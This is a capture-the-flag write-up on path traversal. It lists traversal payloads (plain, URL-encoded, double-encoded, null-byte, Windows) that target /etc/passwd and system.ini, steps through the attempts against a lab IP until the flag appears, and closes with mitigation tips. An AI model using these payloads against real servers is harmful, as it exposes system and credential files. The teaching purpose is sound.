### Title: <span style="color:blue">Path traversal - directory traversal - dot dot slash attacks</span>

This type of attack forces access to files, directories, and commands that are located outside the web document root directory.
`web document root`: refers to the root directory of a web server where the web documents (such as HTML, CSS, JavaScript files, and images) are stored.

an attacker can exploit a `URL` in a way that the web site executes or discloses contents of files on the web server. Even though most web sites restrict user access to the web `document root` or `CGI root `directory, an attacker can gain access to these directories by using special character sequences.
The `../` sequence is a common sequence used by an attacker to access files or to execute commands on the `file system`. the following alternate encodings of this sequence that might be used to bypass security filters:

* `Input Validation`: Lack of proper input validation allows attackers to inject "../" or similar sequences into input fields, such as URLs, to navigate to unauthorized directories.
> Vulnerable URL: http://example.com/viewfile?file=../../../../../etc/passwd
> If the application does not properly validate the "file" parameter, an attacker can use "../" sequences to navigate to sensitive system files like /etc/passwd.

* `URL Encoding`: using URL-encoded (%2e%2e%2f) to bypass input validation and navigate up the directory tree.
>Vulnerable URL: https://example.com/viewfile?file=%2e%2e%2f%2e%2e%2fetc/passwd
>Here, the "../" sequence is URL-encoded as "%2e%2e%2f", allowing the attacker to navigate to the /etc/passwd file.


* `Null Byte (%00)`: Some older systems interpret a null byte (%00) as the end of a string. Attackers can use this to truncate the path and access files or directories they shouldn't.
>Vulnerable URL: http://example.com/viewfile?file=../../../../etc/passwd%00


* `Double URL Encoding`: (%252e%252e%252f) to evade detection by security mechanisms that decode URLs.-
>Vulnerable URL: http://example.com/viewfile?file=%252e%252e%252f%252e%252e%252fetc/passwd

* `Encoded Slashes`: encoded versions of slashes (%2f) to traverse directories, especially in cases where the application does not decode URL-encoded characters correctly.
>Vulnerable URL: https://example.com/viewfile?file=%2f%2e%2e%2f%2e%2e%2fetc/passwd


* `Windows Path Traversal`: On Windows systems, backslashes are used instead of slashes (/) to perform a traverse attack to directories and access sensitive files like `system.ini`.
>Vulnerable URL: https://example.com/viewfile?file=..\..\..\..\Windows\system.ini

* `Relative/Absolute Paths`: Understanding whether the application uses relative or absolute paths for file operations.
suppose an application uses relative paths for file operations and expects user input like filename.txt. An attacker can manipulate the input to access a file outside the intended directory, e.g., ../../../../../etc/passwd.

**Location:** `page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

**Step0**
in this location, it appears in the location setetd before, could be vulnerable to path traversal attacks if not properly sanitized:

we tried : http://10.13.100.74/?page=../../etc/passwd: an alert shows wtf
we tried : http://10.13.100.74/?page=../.././../../../etc/passwd: an alert shows nope
we tried : http://10.13.100.74/?page=../../../../../../../../../etc/passwd: an alert shows almost
we  keep tring : http://10.13.100.74/?page=../../../../../../../../../etc/passwd: teh alert shows now a diffrent message

Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
>NOTE
> etc/passwd is a common file used to demonstrate directory traversal, as it is often used by crackers to try cracking the passwords.


**To prevent**
To mitigate traversal attacks, it's important to validate and sanitize user input, especially when dealing with file paths or URLs, and to restrict access permissions to sensitive files and directories.
you can take several measures:

* `input validation`: Validate and sanitize all user input, especially file paths and URLs, to ensure they do not contain any malicious characters or sequences.

Javascript example: 
// function sanitizeInput(input) {
//   return input.replace(/[^a-z0-9]/gi, ''); // Remove all non-alphanumeric characters
//}

* `Use Whitelists`: to specify allowed `file paths` or `directories` that users can access. This helps prevent unauthorized access to sensitive files.

php example:
// $allowedDirectories = ['/var/www/html/uploads/', '/var/www/html/images/'];
// $userInput = $_GET['file'];

// if (in_array($userInput, $allowedDirectories)) {
    // Access the file
// } else {
    // Return an error
//}

* Limit File Permissions: Ensure that the web server process has limited permissions and can only access files and directories necessary for its operation. for example in nginx server, the www-data user is created during the its installation and is configured in the Nginx configuration files. By default, the www-data user does not have root privileges and has limited access to the file system.


* `secure framework`: Use a secure development framework, such as Django (Python) or Spring Boot (Java), which includes built-in protections against common attacks like directory traversal.


* `Logging and Monitoring`: Implement logging and monitoring to detect and respond to suspicious activity, such as multiple failed directory traversal attem

**Resources**

What is directory traversal: https://www.youtube.com/watch?v=NQwUDLMOrHo&t=140s
Directory traversal: https://www.invicti.com/learn/directory-traversal-path-traversal/